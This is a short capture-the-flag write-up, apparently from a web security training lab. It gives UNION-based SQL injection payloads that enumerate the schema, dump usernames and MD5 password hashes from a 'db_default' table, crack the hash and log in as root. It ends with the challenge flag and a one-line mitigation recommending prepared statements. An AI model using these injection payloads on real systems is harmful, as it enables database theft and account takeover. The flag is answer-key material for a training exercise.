# db_default SQL Injection

`1 or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`
There is a `db_default` table on the database as well in the database `Member_Brute_Force`

>db_default -> hex = 0x64625f64656661756c74

`1 or 1=1 UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns where table_name = 0x64625f64656661756c74`

>id,username,password

`1 or 1=1 UNION SELECT NULL,group_concat(id,0x0a,username,0x0a,password) from Member_Brute_Force.db_default`

>1
root
3bf1114a986ba87ed28fc1b5884fc2f8,2
admin
3bf1114a986ba87ed28fc1b5884fc2f8

>3bf1114a986ba87ed28fc1b5884fc2f8 MD5 decoded -> shadow

Sign in with root:shadow or admin:shadow from link on main page or {ip}/?page=signin

Flag: b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

# Mitigation

Do not blindly enter user input into hardcoded SQL statements. Instead use a library that sanitizes and prepares SQL statements for you using the parameters a user gives.